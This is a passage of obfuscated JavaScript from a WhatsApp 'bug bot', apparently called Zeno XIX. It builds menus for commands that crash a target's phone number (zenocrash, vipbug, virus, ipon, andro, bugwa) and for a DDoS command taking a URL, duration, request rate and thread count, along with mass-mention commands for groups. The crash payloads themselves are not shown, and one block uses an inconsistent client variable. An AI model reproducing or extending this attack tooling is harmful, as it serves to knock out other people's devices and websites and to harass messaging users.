                  'footer': {
                    'text': ''
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': 'cta_url',
                      'buttonParamsJson': "{\ndisplay_text: '𝘿𝙧𝙖𝙮𝙓𝘿 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    'messageParamsJson': ''
                  }
                }
              }
            }
          }, {
            'quoted': _0xe0b9f4
          });
          await _0x1e35db.relayMessage(_0xe0b9f4.chat, _0x3df7c7.message, {
            'messageId': _0x3df7c7.key.id
          });
        }
        break;
      case 'zenocrash':
        {
          await _0x3e2c98();
          let _0x576b0f = await prepareWAMessageMedia({
            'image': _0x36762e
          }, {
            'upload': _0x1e35db.waUploadToServer
          });
          let _0x310d89 = "𝒁𝑬𝑵𝑶 𝐗𝐈𝐗\n𝖅𝖊𝖓𝖔 𝕹𝖊𝖜 𝕰𝖗𝖆 𝕾𝖕𝖊𝖘𝖎𝖆𝖑 𝖀𝖕𝖉𝖆𝖙𝖊\n\nі 𝖿ᥙᥴk ᥡ᥆ᥙ, ᥡ᥆ᥙ ᥴᥲᥒ'𝗍 kіᥣᥣ mᥱ 🤬\n▬▭▬▭▬▭▬▭▬▭\n🔥 𝐎𝐰𝐧 : " + global.namaown + "\n🔥 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝘿𝙧𝙖𝙮𝙓𝘿👿\n🔥 𝐁𝐨𝐭 : " + global.namabot + "\n🔥 𝐕𝐞𝐫𝐬𝐢 : " + global.versisc + "\n     \n" + global.simbol + " ᴢᴇɴᴏ-ᴀᴛᴛᴀᴄᴋ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴢᴇɴᴏ-𝟷ᴊᴀᴍ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴢᴇɴᴏ-𝟷ʜᴀʀɪ － 𝗻𝘂𝗺𝗯𝗲𝗿 －";
          const _0x2fd5cc = generateWAMessageFromContent(_0xe0b9f4.chat, {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    ..._0x576b0f,
                    'hasMediaAttachment': false
                  },
                  'body': {
                    'text': _0x310d89
                  },
                  'footer': {
                    'text': ''
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "cta_url",
                      'buttonParamsJson': "{\ndisplay_text: '𝘿𝙧𝙖𝙮𝙓𝘿 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    'messageParamsJson': ''
                  }
                }
              }
            }
          }, {
            'quoted': _0xe0b9f4
          });
          await _0x1e35db.relayMessage(_0xe0b9f4.chat, _0x2fd5cc.message, {
            'messageId': _0x2fd5cc.key.id
          });
        }
        break;
      case "vipbug":
        {
          await _0x3e2c98();
          let _0x5f011e = await prepareWAMessageMedia({
            'image': _0x36762e
          }, {
            'upload': _0x1e35db.waUploadToServer
          });
          let _0x3c618a = "𝒁𝑬𝑵𝑶 𝐗𝐈𝐗\n𝖅𝖊𝖓𝖔 𝕹𝖊𝖜 𝕰𝖗𝖆 𝕾𝖕𝖊𝖘𝖎𝖆𝖑 𝖀𝖕𝖉𝖆𝖙𝖊\n\nі 𝖿ᥙᥴk ᥡ᥆ᥙ, ᥡ᥆ᥙ ᥴᥲᥒ'𝗍 kіᥣᥣ mᥱ 🤬\n▬▭▬▭▬▭▬▭▬▭\n🔥 𝐎𝐰𝐧 : " + global.namaown + "\n🔥 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝘿𝙧𝙖𝙮𝙓𝘿👿\n🔥 𝐁𝐨𝐭 : " + global.namabot + "\n🔥 𝐕𝐞𝐫𝐬𝐢 : " + global.versisc + "\n     \n" + global.simbol + " ᴢᴇɴᴏ-ᴡᴀʀ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴢᴇɴᴏ-ᴋɪʟʟ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴢᴇɴᴏ-ᴍᴀʀᴀʜ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴠɪᴘ-ʙᴜɢ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴡᴀʀᴅᴇᴋ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴀɴᴛɪɢᴇᴅᴏʀ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ɪɴғɪɴɪᴛʏ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " xʙʟᴀɴᴋ － 𝗻𝘂𝗺𝗯𝗲𝗿 －";
          const _0x407a81 = generateWAMessageFromContent(_0xe0b9f4.chat, {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    ..._0x5f011e,
                    'hasMediaAttachment': false
                  },
                  'body': {
                    'text': _0x3c618a
                  },
                  'footer': {
                    'text': ''
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "cta_url",
                      'buttonParamsJson': "{\ndisplay_text: '𝘿𝙧𝙖𝙮𝙓𝘿 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    'messageParamsJson': ''
                  }
                }
              }
            }
          }, {
            'quoted': _0xe0b9f4
          });
          await _0x1e35db.relayMessage(_0xe0b9f4.chat, _0x407a81.message, {
            'messageId': _0x407a81.key.id
          });
        }
        break;
      case "buginplace":
        {
          await _0x3e2c98();
          let _0x2a75c6 = await prepareWAMessageMedia({
            'image': _0x36762e
          }, {
            'upload': _0x1e35db.waUploadToServer
          });
          let _0x107e06 = "𝒁𝑬𝑵𝑶 𝐗𝐈𝐗\n𝖅𝖊𝖓𝖔 𝕹𝖊𝖜 𝕰𝖗𝖆 𝕾𝖕𝖊𝖘𝖎𝖆𝖑 𝖀𝖕𝖉𝖆𝖙𝖊\n\nі 𝖿ᥙᥴk ᥡ᥆ᥙ, ᥡ᥆ᥙ ᥴᥲᥒ'𝗍 kіᥣᥣ mᥱ 🤬\n▬▭▬▭▬▭▬▭▬▭\n🔥 𝐎𝐰𝐧 : " + global.namaown + "\n🔥 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝘿𝙧𝙖𝙮𝙓𝘿👿\n🔥 𝐁𝐨𝐭 : " + global.namabot + "\n🔥 𝐕𝐞𝐫𝐬𝐢 : " + global.versisc + "\n     \n" + global.simbol + " ᴍᴀs\n" + global.simbol + " ʜᴀʟᴏ\n" + global.simbol + " ᴀᴋᴜʜᴀᴍɪʟ\n" + global.simbol + " ᴄʀᴏᴛ";
          const _0x253f73 = generateWAMessageFromContent(_0xe0b9f4.chat, {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    ..._0x2a75c6,
                    'hasMediaAttachment': false
                  },
                  'body': {
                    'text': _0x107e06
                  },
                  'footer': {
                    'text': ''
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "cta_url",
                      'buttonParamsJson': "{\ndisplay_text: '𝘿𝙧𝙖𝙮𝙓𝘿 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    'messageParamsJson': ''
                  }
                }
              }
            }
          }, {
            'quoted': _0xe0b9f4
          });
          await _0x1e35db.relayMessage(_0xe0b9f4.chat, _0x253f73.message, {
            'messageId': _0x253f73.key.id
          });
        }
        break;
      case "emojibug":
        {
          await _0x3e2c98();
          let _0x1c893c = await prepareWAMessageMedia({
            'image': _0x36762e
          }, {
            'upload': _0x1e35db.waUploadToServer
          });
          let _0x1f3daa = "𝒁𝑬𝑵𝑶 𝐗𝐈𝐗\n𝖅𝖊𝖓𝖔 𝕹𝖊𝖜 𝕰𝖗𝖆 𝕾𝖕𝖊𝖘𝖎𝖆𝖑 𝖀𝖕𝖉𝖆𝖙𝖊\n\nі 𝖿ᥙᥴk ᥡ᥆ᥙ, ᥡ᥆ᥙ ᥴᥲᥒ'𝗍 kіᥣᥣ mᥱ 🤬\n▬▭▬▭▬▭▬▭▬▭\n🔥 𝐎𝐰𝐧 : " + global.namaown + "\n🔥 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝘿𝙧𝙖𝙮𝙓𝘿👿\n🔥 𝐁𝐨𝐭 : " + global.namabot + "\n🔥 𝐕𝐞𝐫𝐬𝐢 : " + global.versisc + "\n     \n" + global.simbol + " 🗿 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " 🤙 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " 😍 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " 🔪 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " 🌹 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " 🐷 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " 😜 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " 👊 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " 😑 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " 👍 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " 🤫 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " 🤣 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " 😡 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " 🤡 － 𝗻𝘂𝗺𝗯𝗲𝗿 －";
          const _0x5794ce = generateWAMessageFromContent(_0xe0b9f4.chat, {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    ..._0x1c893c,
                    'hasMediaAttachment': false
                  },
                  'body': {
                    'text': _0x1f3daa
                  },
                  'footer': {
                    'text': ''
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "cta_url",
                      'buttonParamsJson': "{\ndisplay_text: '𝘿𝙧𝙖𝙮𝙓𝘿 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    'messageParamsJson': ''
                  }
                }
              }
            }
          }, {
            'quoted': _0xe0b9f4
          });
          await _0x1e35db.relayMessage(_0xe0b9f4.chat, _0x5794ce.message, {
            'messageId': _0x5794ce.key.id
          });
        }
        break;
      case "ipon":
        {
          await _0x3e2c98();
          let _0x5f2784 = await prepareWAMessageMedia({
            'image': _0x36762e
          }, {
            'upload': _0x1e35db.waUploadToServer
          });
          let _0x5f3425 = "𝒁𝑬𝑵𝑶 𝐗𝐈𝐗\n𝖅𝖊𝖓𝖔 𝕹𝖊𝖜 𝕰𝖗𝖆 𝕾𝖕𝖊𝖘𝖎𝖆𝖑 𝖀𝖕𝖉𝖆𝖙𝖊\n\nі 𝖿ᥙᥴk ᥡ᥆ᥙ, ᥡ᥆ᥙ ᥴᥲᥒ'𝗍 kіᥣᥣ mᥱ 🤬\n▬▭▬▭▬▭▬▭▬▭\n🔥 𝐎𝐰𝐧 : " + global.namaown + "\n🔥 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝘿𝙧𝙖𝙮𝙓𝘿👿\n🔥 𝐁𝐨𝐭 : " + global.namabot + "\n🔥 𝐕𝐞𝐫𝐬𝐢 : " + global.versisc + "\n     \n" + global.simbol + " ɪᴘʜᴏɴᴇ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " xɪᴘʜᴏɴᴇ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴋɪʟʟɪᴏs － 𝗻𝘂𝗺𝗯𝗲𝗿 －";
          const _0x4b2e2b = generateWAMessageFromContent(_0xe0b9f4.chat, {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    ..._0x5f2784,
                    'hasMediaAttachment': false
                  },
                  'body': {
                    'text': _0x5f3425
                  },
                  'footer': {
                    'text': ''
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "cta_url",
                      'buttonParamsJson': "{\ndisplay_text: '𝘿𝙧𝙖𝙮𝙓𝘿 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    'messageParamsJson': ''
                  }
                }
              }
            }
          }, {
            'quoted': _0xe0b9f4
          });
          await _0x1e35db.relayMessage(_0xe0b9f4.chat, _0x4b2e2b.message, {
            'messageId': _0x4b2e2b.key.id
          });
        }
        break;
      case "andro":
        {
          await _0x3e2c98();
          let _0x32a262 = await prepareWAMessageMedia({
            'image': _0x36762e
          }, {
            'upload': _0x1e35db.waUploadToServer
          });
          let _0x1026e0 = "𝒁𝑬𝑵𝑶 𝐗𝐈𝐗\n𝖅𝖊𝖓𝖔 𝕹𝖊𝖜 𝕰𝖗𝖆 𝕾𝖕𝖊𝖘𝖎𝖆𝖑 𝖀𝖕𝖉𝖆𝖙𝖊\n\nі 𝖿ᥙᥴk ᥡ᥆ᥙ, ᥡ᥆ᥙ ᥴᥲᥒ'𝗍 kіᥣᥣ mᥱ 🤬\n▬▭▬▭▬▭▬▭▬▭\n🔥 𝐎𝐰𝐧 : " + global.namaown + "\n🔥 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝘿𝙧𝙖𝙮𝙓𝘿👿\n🔥 𝐁𝐨𝐭 : " + global.namabot + "\n🔥 𝐕𝐞𝐫𝐬𝐢 : " + global.versisc + "\n     \n" + global.simbol + " ᴀɴᴛɪ-ᴀɴᴅʀᴏ𝟷 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴀɴᴛɪ-ᴀɴᴅʀᴏ𝟸 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴀɴᴛɪ-ᴀɴᴅʀᴏ𝟹 － 𝗻𝘂𝗺𝗯𝗲𝗿 －";
          const _0x7ecbaa = generateWAMessageFromContent(_0xe0b9f4.chat, {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    ..._0x32a262,
                    'hasMediaAttachment': false
                  },
                  'body': {
                    'text': _0x1026e0
                  },
                  'footer': {
                    'text': ''
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "cta_url",
                      'buttonParamsJson': "{\ndisplay_text: '𝘿𝙧𝙖𝙮𝙓𝘿 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    'messageParamsJson': ''
                  }
                }
              }
            }
          }, {
            'quoted': _0xe0b9f4
          });
          await _0x1e35db.relayMessage(_0xe0b9f4.chat, _0x7ecbaa.message, {
            'messageId': _0x7ecbaa.key.id
          });
        }
        break;
      case "virus":
        {
          await _0x3e2c98();
          let _0x4a7292 = await prepareWAMessageMedia({
            'image': _0x36762e
          }, {
            'upload': _0x1e35db.waUploadToServer
          });
          let _0x181729 = "𝒁𝑬𝑵𝑶 𝐗𝐈𝐗\n𝖅𝖊𝖓𝖔 𝕹𝖊𝖜 𝕰𝖗𝖆 𝕾𝖕𝖊𝖘𝖎𝖆𝖑 𝖀𝖕𝖉𝖆𝖙𝖊\n\nі 𝖿ᥙᥴk ᥡ᥆ᥙ, ᥡ᥆ᥙ ᥴᥲᥒ'𝗍 kіᥣᥣ mᥱ 🤬\n▬▭▬▭▬▭▬▭▬▭\n🔥 𝐎𝐰𝐧 : " + global.namaown + "\n🔥 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝘿𝙧𝙖𝙮𝙓𝘿👿\n🔥 𝐁𝐨𝐭 : " + global.namabot + "\n🔥 𝐕𝐞𝐫𝐬𝐢 : " + global.versisc + "\n     \n" + global.simbol + " ᴠɪʀᴛᴇx － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " sʟᴀʏᴇʀ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴅᴀʀᴋɴᴇss － 𝗻𝘂𝗺𝗯𝗲𝗿 －";
          const _0x3a251b = generateWAMessageFromContent(_0xe0b9f4.chat, {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    ..._0x4a7292,
                    'hasMediaAttachment': false
                  },
                  'body': {
                    'text': _0x181729
                  },
                  'footer': {
                    'text': ''
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "cta_url",
                      'buttonParamsJson': "{\ndisplay_text: '𝘿𝙧𝙖𝙮𝙓𝘿 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    'messageParamsJson': ''
                  }
                }
              }
            }
          }, {
            'quoted': _0xe0b9f4
          });
          await _0x1e35db.relayMessage(_0xe0b9f4.chat, _0x3a251b.message, {
            'messageId': _0x3a251b.key.id
          });
        }
        break;
      case 'bugwa':
        {
          await _0x3e2c98();
          let _0x96350f = await prepareWAMessageMedia({
            'image': _0x36762e
          }, {
            'upload': _0x1e35db.waUploadToServer
          });
          let _0x535944 = "𝒁𝑬𝑵𝑶 𝐗𝐈𝐗\n𝖅𝖊𝖓𝖔 𝕹𝖊𝖜 𝕰𝖗𝖆 𝕾𝖕𝖊𝖘𝖎𝖆𝖑 𝖀𝖕𝖉𝖆𝖙𝖊\n\nі 𝖿ᥙᥴk ᥡ᥆ᥙ, ᥡ᥆ᥙ ᥴᥲᥒ'𝗍 kіᥣᥣ mᥱ 🤬\n▬▭▬▭▬▭▬▭▬▭\n🔥 𝐎𝐰𝐧 : " + global.namaown + "\n🔥 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝘿𝙧𝙖𝙮𝙓𝘿👿\n🔥 𝐁𝐨𝐭 : " + global.namabot + "\n🔥 𝐕𝐞𝐫𝐬𝐢 : " + global.versisc + "\n     \n" + global.simbol + " ʙᴇᴛᴀ-ɴᴇᴡ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴡᴀ-ʙᴜsɪɴs － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴡᴀ-ᴍᴏᴅ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴡᴀ-ᴏʀɪ － 𝗻𝘂𝗺𝗯𝗲𝗿 －";
          const _0x2752b7 = generateWAMessageFromContent(_0xe0b9f4.chat, {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    ..._0x96350f,
                    'hasMediaAttachment': false
                  },
                  'body': {
                    'text': _0x535944
                  },
                  'footer': {
                    'text': ''
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "cta_url",
                      'buttonParamsJson': "{\ndisplay_text: '𝘿𝙧𝙖𝙮𝙓𝘿 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    'messageParamsJson': ''
                  }
                }
              }
            }
          }, {
            'quoted': _0xe0b9f4
          });
          await Zyn.relayMessage(_0xe0b9f4.chat, _0x2752b7.message, {
            'messageId': _0x2752b7.key.id
          });
        }
        break;
      case "ddosmenu":
        {
          await _0x3e2c98();
          let _0x459b72 = await prepareWAMessageMedia({
            'image': _0x36762e
          }, {
            'upload': _0x1e35db.waUploadToServer
          });
          let _0x309f85 = "𝒁𝑬𝑵𝑶 𝐗𝐈𝐗\n𝖅𝖊𝖓𝖔 𝕹𝖊𝖜 𝕰𝖗𝖆 𝕾𝖕𝖊𝖘𝖎𝖆𝖑 𝖀𝖕𝖉𝖆𝖙𝖊\n\nі 𝖿ᥙᥴk ᥡ᥆ᥙ, ᥡ᥆ᥙ ᥴᥲᥒ'𝗍 kіᥣᥣ mᥱ 🤬\n▬▭▬▭▬▭▬▭▬▭\n🔥 𝐎𝐰𝐧 : " + global.namaown + "\n🔥 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝘿𝙧𝙖𝙮𝙓𝘿👿\n🔥 𝐁𝐨𝐭 : " + global.namabot + "\n🔥 𝐕𝐞𝐫𝐬𝐢 : " + global.versisc + "\n     \n" + global.simbol + " ᴅᴅᴏs －𝘂𝗿𝗹 𝘁𝗶𝗺𝗲 𝗿𝗽𝘀 𝘁𝗵𝗿𝗲𝗮𝗱－\n" + global.simbol + " ᴄʜᴇᴄᴋʜᴏsᴛ －𝘂𝗿𝗹－";
          const _0x113f5b = generateWAMessageFromContent(_0xe0b9f4.chat, {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    ..._0x459b72,
                    'hasMediaAttachment': false
                  },
                  'body': {
                    'text': _0x309f85
                  },
                  'footer': {
                    'text': ''
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "cta_url",
                      'buttonParamsJson': "{\ndisplay_text: '𝘿𝙧𝙖𝙮𝙓𝘿 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    'messageParamsJson': ''
                  }
                }
              }
            }
          }, {
            'quoted': _0xe0b9f4
          });
          await _0x1e35db.relayMessage(_0xe0b9f4.chat, _0x113f5b.message, {
            'messageId': _0x113f5b.key.id
          });
        }
        break;
      case 'ownermenu':
        {
          await _0x3e2c98();
          let _0x5bf443 = await prepareWAMessageMedia({
            'image': _0x36762e
          }, {
            'upload': _0x1e35db.waUploadToServer
          });
          let _0xbf5ff5 = "𝒁𝑬𝑵𝑶 𝐗𝐈𝐗\n𝖅𝖊𝖓𝖔 𝕹𝖊𝖜 𝕰𝖗𝖆 𝕾𝖕𝖊𝖘𝖎𝖆𝖑 𝖀𝖕𝖉𝖆𝖙𝖊\n\nі 𝖿ᥙᥴk ᥡ᥆ᥙ, ᥡ᥆ᥙ ᥴᥲᥒ'𝗍 kіᥣᥣ mᥱ 🤬\n▬▭▬▭▬▭▬▭▬▭\n🔥 𝐎𝐰𝐧 : " + global.namaown + "\n🔥 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝘿𝙧𝙖𝙮𝙓𝘿👿\n🔥 𝐁𝐨𝐭 : " + global.namabot + "\n🔥 𝐕𝐞𝐫𝐬𝐢 : " + global.versisc + "\n     \n" + global.simbol + " ᴀᴅᴅᴍᴜʀʙᴜɢ\n" + global.simbol + " ᴅᴇʟᴍᴜʀʙᴜɢ\n" + global.simbol + " ᴘᴜʙʟɪᴄ\n" + global.simbol + " sᴇʟғ";
          const _0x205771 = generateWAMessageFromContent(_0xe0b9f4.chat, {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    ..._0x5bf443,
                    'hasMediaAttachment': false
                  },
                  'body': {
                    'text': _0xbf5ff5
                  },
                  'footer': {
                    'text': ''
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': 'cta_url',
                      'buttonParamsJson': "{\ndisplay_text: '𝘿𝙧𝙖𝙮𝙓𝘿 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    'messageParamsJson': ''
                  }
                }
              }
            }
          }, {
            'quoted': _0xe0b9f4
          });
          await _0x1e35db.relayMessage(_0xe0b9f4.chat, _0x205771.message, {
            'messageId': _0x205771.key.id
          });
        }
        break;
      case 'z':
      case "hidetag":
        if (!_0xd5b998) {
          return _0xd6f2c2(mess.only.owner);
        }
        if (!_0x2741d2) {
          return _0xd6f2c2("Teks?");
        }
        _0x1e35db.sendMessage(_0xe0b9f4.chat, {
          'text': _0x2741d2 ? _0x2741d2 : '',
          'mentions': _0x229bdc.map(_0xe5c530 => _0xe5c530.id)
        }, {
          'quoted': _0xe0b9f4
        });
        break;
      case "tagall":
        {
          if (!_0xd5b998 && !_0x19ae44) {
            return _0xd6f2c2(mess.admin);
          }
          if (!_0x2535de) {
            return joreply(mess.only.group);
          }
          if (!q) {
            return _0xd6f2c2("Teks Nya Mana Kak?");
          }
          let _0x4de6f0 = (q ? q : '') + "\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎